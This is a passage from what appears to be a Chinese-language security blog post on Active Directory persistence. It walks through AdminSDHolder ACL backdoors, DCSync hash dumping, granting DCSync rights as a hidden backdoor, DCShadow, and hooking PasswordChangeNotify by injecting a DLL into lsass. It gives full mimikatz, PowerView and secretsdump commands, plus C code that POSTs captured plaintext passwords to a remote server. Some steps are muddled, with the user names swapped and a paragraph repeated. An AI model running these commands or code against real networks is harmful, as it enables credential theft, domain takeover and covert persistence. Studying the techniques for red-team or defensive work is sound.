+<li><p>通过<strong>PowerShell</strong>查看<strong>Mount</strong>用户的属性：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser Mount -Properties SIDHistory</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以发现其<strong>SID History</strong>属性值已经与<strong>Administrator</strong>用户的<strong>SID</strong>相同，这说明<strong>Hacker</strong>用户将继承<strong>Administrator</strong>用户的所有权限</p>
+</li>
+<li><p>通过<strong>Hacker</strong>用户成功连接到域控制器，执行<code>whoami /priv</code>命令，可以看到该用户拥有域管理员的所有特权</p>
+</li>
+</ol>
+<p>第一步的报错没解决</p>
+<h3 id="利用AdminSDHolder打造与后门"><a href="#利用AdminSDHolder打造与后门" class="headerlink" title="利用AdminSDHolder打造与后门"></a>利用AdminSDHolder打造与后门</h3><h4 id="1-AdminSDHolder"><a href="#1-AdminSDHolder" class="headerlink" title="1.AdminSDHolder"></a>1.AdminSDHolder</h4><p><strong>AdminSDHolder</strong>是一个特殊的<strong>Active Directory</strong>容器对象，位于<strong>Domain NC</strong>的<strong>System</strong>容器下。<strong>AdminSDHolder</strong>通常作为系统中某些受保护对象的安全模板，以防止这些对象遭受恶意修改或滥用。</p>
+<p>受保护对象通常包括系统的特权用户和重要的组，如<strong>Administrator</strong>、<strong>Domain Admins</strong>、 <strong>Enterprise Admins</strong>以及<strong>Schema Admins</strong>等。<br>在活动目录中，属性<strong>adminCount</strong>用来标记特权用户和组。对于特权用户和组来说，该属性值被设为<strong>1</strong>通过<strong>AdFind</strong>查询<strong>adminCount</strong>属性设置为<strong>1</strong>的对象，可以找到所有受<strong>AdminSDHolder</strong>保护的特权用户和组。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 枚举受保护的用户</span><br><span class="line">Adfind.exe -b "dc=hack-my,dc=com" -f "&amp;(objectcategory=person)(samaccountname=*)(admincount=1)" -dn</span><br><span class="line"># 枚举受保护的组</span><br><span class="line">Adfind.exe -b "dc=hack-my,dc=com" -f "&amp;(objectcategory=group)(admincount=1)" -dn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在默认情况下，系统将定期（每60分钟）检查受保护对象的安全描述符，将受保护对象的<strong>ACL</strong>与<strong>AdminSDHolder</strong>容器的<strong>ACL</strong>进行比较，如果二者不一致，系统就会将受保护对象的<strong>ACL</strong>强制修改为<strong>AdminSDHolder</strong>容器的<strong>ACL</strong>。该工作通过<strong>SDProp</strong>进程来完成，该进程以60分钟为一个工作周期。</p>
+<h4 id="2-利用方法-1"><a href="#2-利用方法-1" class="headerlink" title="2.利用方法"></a>2.利用方法</h4><p>在实战中，测试人员可以篡改<strong>AdminSDHolder</strong>容器的<strong>ACL</strong>配置。当系统调用<strong>SDProp</strong>进程执行相关工作时，被篡改的<strong>ACL</strong>配置将同步到受保护对象的<strong>ACL</strong>中，以此建立一个隐蔽的域后门。利用该技术需要拥有域管理员级别的权限。<br>执行以下命令，通过<strong>PowerView</strong>向<strong>AdminSDHolder</strong>容器对象添加一个<strong>ACL</strong>，使普通域用户<strong>Marcus</strong>拥有对<strong>AdminSDHolder</strong>的“完全控制”权限。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com" -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行后，<strong>Marcus</strong>用户成功拥有<strong>AdminSDHolder</strong>容器对象的完全控制权限。等待60分钟后，<strong>Mount</strong>用户将获得对系统中的特权用户和组完全控制权限。测试人员也可以手动修改<strong>SDProp</strong>进程的工作周期，以缩短等待的时长，相关方法请读者自行上网查阅，这里不再赘述。<br>此时，<strong>Marcus</strong>用户可成功向<strong>Domain Admins</strong>等关键用户组内添加成员。<br>如果清除<strong>Marcus</strong>用户对<strong>AdminSDHolder</strong>的完全控制权限，可以执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=hack-my, DC=com" -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240304223028652.png" class="" title="image-20240304223028652">
+
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240304223040987.png" class="" title="image-20240304223040987">
+
+<p>执行后，<strong>Marcus</strong>用户成功拥有<strong>AdminSDHolder</strong>容器对象的完全控制权限等待<strong>60</strong>分钟后，<strong>Marcus</strong>用户将获得对系统中的特权用户和组完全控制权限。测试人员也可以手动修改<strong>SDProp</strong>进程的工作周期，以缩短等待的时长，相关方法请读者自行上网查阅，这里不再赘述。<br>此时，<strong>Marcus</strong>用户可成功向<strong>Domain Admins</strong>等关键用户组内添加成员<br>如果清除<strong>Marcus</strong>用户对<strong>AdminSDHolder</strong>的完全控制权限，可以执行以下命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainobjectAcL -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=hack-my, DC=com" -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p><strong>PasswordChangeNotify</strong>在微软官方文档中的名称为<strong>PsamPasswordNotificationRoutine</strong>，是一个<strong>Windows API</strong>。当用户重置密码时，<strong>Windows</strong>会先检查新密码是否符合复杂性要求，如果密码符合要求，<strong>LSA</strong>会调用<strong>PasswordChangeNotify</strong>函数在系统中同步密码。该函数的语法大致如下。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PSAM_PASSWORD_NOTIFICATION_ROUTINE PsamPasswordNotificationRoutine;</span><br><span class="line">NTSTATUS PsamPasswordNotificationRoutine(</span><br><span class="line">	[in] PUNICODE_STRING UserName,</span><br><span class="line">	[in] ULONG RelativeId，</span><br><span class="line">	[in] PUNICODE_STRING NewPassword</span><br><span class="line">)</span><br><span class="line">{...}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当调用<strong>PasswordChangeNotify</strong>时，用户名和密码将以明文的形式传入。测试人员可以通过<strong>HOOK</strong>技术，劫持<strong>PasswordChangeNotify</strong>函数的执行流程，从而获取传入的明文密码。下面以<strong>Windows Server2016</strong>的域控制器进行演示，需要的工具包括<strong>Hook-PasswordChange.dll</strong>（见Github的相关网页）和<strong>HookPasswordChange.dll</strong>（位于<strong>PowerSploit</strong>项目的<strong>CodeExecution</strong>目录下）。</p>
+<ol>
+<li><p>将编译好的<strong>HookPasswordChange.dll</strong>和<strong>Invoke-ReflectivePEInjection.ps1</strong>上传到域控制器，并通过<strong>Invoke-ReflectivePEInjection.ps1</strong>将<strong>HookPasswordChange.dl</strong>注入<strong>Isass.exe</strong>进程，相关命令如下。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 导入Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line"># 读取HookPasswordChange.dll并将其注入lsass进程</span><br><span class="line">$PEBytes = [IO.File]::ReadAllBytes('C:\Users\Administrator\HookPasswordChange.dll')</span><br><span class="line">Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>当网络管理员修改用户密码时，用户的新密码将记录在<code>C:\Windows\Temp</code>目录的<strong>passwords.txt</strong>文件中<br>此外，<strong>passwords.txt</strong>文件的保存路径可以自定义，需要在<strong>HookPasswordChange.cpp</strong>文件中修改<br>为了将获取到的用户密码传回远程服务器，在源码的基础上通过<strong>WinINet API</strong>添加了一个简单的<strong>HTTP</strong>请求功能，相关代码大致如下。修改后的项目见Github的相关网页。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HINTERNET hInternet = InternetOpen(L"Mozilla/5.0 (Windows NT 10.0；Win64；x64)</span><br><span class="line">	AppleWebKit/537.36 (KHTML,like Gecko) Chrome/98.0.4758.81 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT,NULL,NULL，0);</span><br><span class="line">	if (hInternet =NULL)</span><br><span class="line">{</span><br><span class="line">	InternetcloseHandle(hInternet);</span><br><span class="line">}</span><br><span class="line">HINTERNET hSession = InternetConnect(hInternet, L"192.168.2.143", 2333, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);</span><br><span class="line">if (hSession == NULL)</span><br><span class="line">{</span><br><span class="line">	InternetcloseHandle(hSession);</span><br><span class="line">	</span><br><span class="line">	InternetCloseHandle(hInternet);</span><br><span class="line">}</span><br><span class="line">char strUserName[128];</span><br><span class="line">char strPassWord[128];</span><br><span class="line">WideCharToMultiByte(CP_ACP, 0, userName, -1, strUserName, sizeof(strUserName), NULL, NULL); WideCharToMultiByte(CP_ACP, 0, password, -1, strPassWord, sizeof(strPassWord), NULL, NULL); char Credential[128];</span><br><span class="line">snprintf(Credential, sizeof(Credential), "username=%s&amp;password=%s", struserName, strPassWord);</span><br><span class="line">HINTERNET hRequest = HttpOpenRequest(hSession, L"POST", L"/", NULL, NULL, NULL, 0, 0);</span><br><span class="line">TCHAR ContentType[] = L"Content-Type: application/x-www-form-urlencoded"; HttpAddRequestHeaders(hRequest,ContentType, -1,  HTTP_ADDREQ_FLAG_ADD HTTP_ADDREQ_FLAG_REPLACE);</span><br><span class="line">HttpSendRequest(hRequest, NULL, 0, Credential, strlen(Credential));</span><br></pre></td></tr></tbody></table></figure></li>
+</ol>
+<p>重新编译生成<strong>HookPasswordChange.dll</strong>并注入<strong>lsass.exe</strong>进程，当管理员修改密码时，将通过<strong>HTTP POST</strong>方法将用户密码外带到远程服务器</p>
+<h2 id="DCSync攻击技术"><a href="#DCSync攻击技术" class="headerlink" title="DCSync攻击技术"></a>DCSync攻击技术</h2><p>一个域环境可以拥有多台域控制器，每台域控制器各自存储着一份所在域的活动目录的可写副本，对目录的任何修改都可以从源域控制器同步到本域、域树或域林中的其他域控制器上。当一个域控想从另一个域控获取域数据更新时，客户端域控会向服务端域控发送<strong>DSGetNCChanges</strong>请求，该请求的响应将包含客户端域控必须应用到其活动目录副本的一组更新。通常情况下，域控制器之间每15分钟就会有一次域数据同步。<br><strong>DCSync</strong>技术就是利用域控制器同步的原理，通过<strong>Directory Replication Service(DRS)<strong>服务的</strong>IDL_DRSGetNCChanges</strong>接口向域控发起数据同步请求。在<strong>DCSync</strong>出现前，要获得所有域用户的哈希，测试人员可能需要登录域控制器或通过卷影拷贝技术获取<strong>NTDS.dit</strong>文件。利用<strong>DCSync</strong>，测试人员可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控制器上的数据。注意，<strong>DCSync</strong>攻击不适用于只读域控制器<strong>（RODC）</strong>。<br>在默认情况下，只有<strong>Administrators</strong>、<strong>Domain Controllers</strong>和<strong>Enterprise Domain Admins</strong>组内的用户和域控制器的机器账户才有执行<strong>DCSync</strong>操作的权限。</p>
+<h3 id="利用DCSync导出域内哈希"><a href="#利用DCSync导出域内哈希" class="headerlink" title="利用DCSync导出域内哈希"></a>利用DCSync导出域内哈希</h3><h5 id="1-MimiKatz下利用"><a href="#1-MimiKatz下利用" class="headerlink" title="1.MimiKatz下利用"></a>1.MimiKatz下利用</h5><p><strong>Mimikatz</strong>在2015年8月的更新中添加了<strong>DCSync</strong>功能。执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 导出域内指定用户的信息，包括哈希值</span><br><span class="line">mimikatz.exe "lsadump::dcsync /domain:bam.local /user:bam.local\administrator" exit</span><br><span class="line"># 导出域内所有用户的信息，包括哈希值</span><br><span class="line">mimikatz.exe "lsadump::dcsync /domain:bam.local /all" exit</span><br><span class="line">mimikatz.exe "lsadump::dcsync /domain:bam.local /all /csv" exit</span><br></pre></td></tr></tbody></table></figure>
+
+<p>导出域内用户的信息，包括哈希值</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240306201541385.png" class="" title="image-20240306201541385">
+
+<p>一般来说，域管理员权限的用户以及<strong>Krbtgt</strong>用户的哈希是有价值的。通过域管理员的哈希进行哈希传递可以直接获取服务器控制权，而<strong>Krbtgt</strong>用户的哈希可以用来制作黄金票据，实现票据传递攻击（将在后面的<strong>Kerberos</strong>专题中进行讲解）。</p>
+<h5 id="Impacket下的利用"><a href="#Impacket下的利用" class="headerlink" title="Impacket下的利用"></a>Impacket下的利用</h5><p><strong>Impacket</strong>项目中的<strong>secretsdump.py</strong>脚本支持通过DCSync技术导出域控制器中用户哈希。该工具可以使用提供的高权限用户的登录凭据，从未加入域的系统上远程连接至域控制器，并从注册表中导出本地账户的哈希值，同时通过<strong>Dcsync</strong>或卷影复制的方法， <strong>NTDS.dit</strong>文件中导出所有域用户的哈希值。<br>执行以下命令:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py hack-my.com/administrator:1qaz@WSX@192.168.111.162 -just-dc-user</span><br><span class="line">"bam.local\administrator"</span><br><span class="line"># 192.168.111.162为域控制器的IP</span><br></pre></td></tr></tbody></table></figure>
+
+<p>导出域管理员<strong>Administrator</strong>用户的哈希值：</p>
+<h3 id="利用DCSync维持域内权限"><a href="#利用DCSync维持域内权限" class="headerlink" title="利用DCSync维持域内权限"></a>利用DCSync维持域内权限</h3><p>在获取域管理员权限后，测试人员可以手动为域内标准用户赋予<strong>DCSync</strong>操作的权限，从而实现隐蔽的域后门。只需为普通域用户添加下表所示的两条扩展权限即可。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240307083153874.png" class="" title="image-20240307083153874">
+
+
+
+<p>可以通过<strong>PowerShell</strong>渗透框架下的<strong>PowerView.ps1</strong>脚本实现。执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line"># 为域用户Mount添加DCSync权限</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity "DC=bam,DC=local" -PrincipalIdentity Mount -Rights DCSync -Verbose</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为域用户<strong>Mount</strong>添加<strong>DCSync</strong>权限。<br>添加成功后，通过<strong>Mount</strong>用户可成功导出域内用户的哈希，如图</p>
+<p>如果将赋予用户的DCSync权限清除，就可以执行以下命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 为域用户Mount删除DCSync权限</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity "DC=hack-bam,DC=local" -PrincipalIdentity Marcus -Rights DCSync -Verbose</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p><strong>DCShadow</strong>是由安全研究员Benjamin Delpy和Vincent Le Toux在2Ol8年的BlueHat大会上公布的一项关于<strong>Windows</strong>域的安全研究成果。该技术同样滥用了域控制器间的DRS数据同步机制，但是将<strong>DCSync</strong>的攻击思路反转。<strong>DCShadow</strong>通过创建恶意的域控制器，利用域控之间的数据同步复制，将预先设定的对象或对象属性注入正在运行的合法域控制器，以此来创建域后门或者获取各种类型的非法访问渠道。<br>下面通过<strong>DCShadow</strong>修改普通域用户<strong>Mount</strong>的<strong>primaryGroupID</strong>属性演示<strong>DCShadow</strong>的攻击过程。该属性在前文已经出现过，其指向用户所属的主要组的<strong>RID</strong>，通过将用户的<strong>primaryGroupID</strong>改为<strong>512</strong>，可以让用户成为域管理员。<strong>RID</strong>指相对标识符，是<strong>SID</strong>的组成部分，位于<strong>SID</strong>字符串的末端。<strong>Windows</strong>系统使用<strong>RID</strong>来区分用户账户和组，常见系统账户的<strong>RID</strong>如表所示。</p>
+<img src="/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/image-20240307084117027.png" class="" title="image-20240307084117027">
+
+<ol>
+<li><p>在域内任意一台主机中上传<strong>Mimikatz</strong>。打开一个命令行窗口，执行以下命令启动数据更改。该命令行窗口需要为<strong>SYSTEM</strong>权限，以拥有适当的权限来创建恶意域控制器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "lsadump::dcshadow /object:CN=mount,CN=Users,DC=bam,DC=local /attribute:primaryGroupID /value:512" exit</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>执行后，第一个命令行窗口不要关闭，并新开一个域管理员权限的命令行窗口。<br>在新的命令行窗口中执行以下命令强制触发域复制，将数据更改推送至合法域控制器。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "lsadump::dcshadow /push" exit</span><br></pre></td></tr></tbody></table></figure></li>
+</ol>
+<p>这时，<strong>Mount</strong>用户的<strong>primaryGroupID</strong>属性已成功被修改为<strong>512</strong>，并且<strong>Mount</strong>已经是域管理员组中的用户了</p>
+<p><strong>DCShadow</strong>使得测试人员可以直接修改活动目录数据库中的对象。在域防护比较严格的情况下，可以通过<strong>DCShadow</strong>操纵<strong>SID History</strong>、<strong>Krbtgt</strong>账户的密码，或将用户添加到特权组，以实现域权限持久化。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/">http://example.com/2024/03/07/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DC4 &amp; DC5</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">热爱学习，分享技术</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Bamboo的博客！原博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">内网权限持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF"><span class="toc-number">1.1.</span> <span class="toc-text">常见系统后门技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.创建影子账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%B3%BB%E7%BB%9F%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.系统任务后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">1.创建系统服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E7%8E%B0%E6%9C%89%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">2.利用现有的系统服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8svchost-exe%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">3.利用svchost.exe启动服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.计划任务后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%90%AF%E5%8A%A8%E9%A1%B9-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%90%8E%E9%97%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.启动项/注册表键后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">1.系统启动文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%BF%90%E8%A1%8C%E9%94%AE%EF%BC%88Run-Keys%EF%BC%89"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">2.运行键（Run Keys）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Winlogon-Helper"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">3.Winlogon Helper</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Port-Monitors"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.Port Monitors</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E8%A7%A6%E5%8F%91%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">事件触发执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用WMI事件订阅</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">1.手动利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%9B%B8%E5%85%B3%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">2.相关辅助工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用系统辅助功能</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">1.手动利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-RDP%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">2.RDP劫持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IFEO%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">IFEO注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Dubugger"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">1.Dubugger</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GlobalFlag"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">GlobalFlag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用屏幕保护程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.5.</span> <span class="toc-text">DLL劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8A%AB%E6%8C%81%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.2.5.0.1.</span> <span class="toc-text">1.劫持应用程序</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.5.0.2.</span> <span class="toc-text">2.劫持系统服务</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 